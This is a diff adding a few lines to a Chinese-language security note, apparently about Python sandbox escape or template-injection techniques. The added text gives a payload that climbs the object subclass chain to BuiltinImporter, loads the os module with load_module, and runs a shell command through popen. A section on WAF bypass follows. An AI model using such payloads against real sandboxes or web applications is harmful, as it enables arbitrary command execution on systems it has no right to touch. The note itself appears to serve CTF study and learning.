@@ -186,4 +186,11 @@ os模块执行命令:
 >
 >在 Python 3 中，文件 I/O 操作应该使用 `open()` 函数来打开文件，而不是直接使用 `file` 类。`open()` 函数返回一个文件对象，它是 `io.TextIOWrapper` 或 `io.BufferedIOBase` 的实例，可以用于进行文件读写操作。
 
+>```
+><class '_frozen_importlib.BuiltinImporter'>类：
+>利用load_module()加载模块os进行执行命令：().__class__.__bases__[0].__subclasses__()[84]['load_module']("os")["popen"]("ls").read()
+>```
+>
+>这里的`load_module`是一个静态方法，所以能够直接通过类调用而不用实例化对象
+
 ### waf绕过
